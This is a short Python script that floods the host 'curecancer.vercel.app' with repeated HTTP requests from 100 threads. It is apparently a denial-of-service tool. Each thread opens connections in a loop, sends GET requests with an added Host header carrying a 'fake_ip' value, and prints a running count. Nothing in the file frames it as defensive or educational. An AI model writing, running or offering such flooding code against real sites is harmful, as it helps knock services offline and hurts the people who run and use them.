import threading
import socket
import time
import signal

target = 'curecancer.vercel.app'
port = 80
fake_ip = '198.168.10.15'

already_connected = 0
running = True

def signal_handler(sig, frame):
    global running
    print("\nAttack stopped by user.")
    running = False

signal.signal(signal.SIGINT, signal_handler)

def attack():
    global already_connected, running
    while running:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_ip = socket.gethostbyname(target)
        s.connect((target_ip, port))
        request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
        s.sendto(request.encode('ascii'), (target_ip, port))
        s.sendto(f"Host: {fake_ip}\r\n\r\n".encode('ascii'), (target_ip, port))
        s.close()
        already_connected += 1
        print(f"Connections made: {already_connected}")
        time.sleep(0.1)

for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()

while running:
    time.sleep(1)
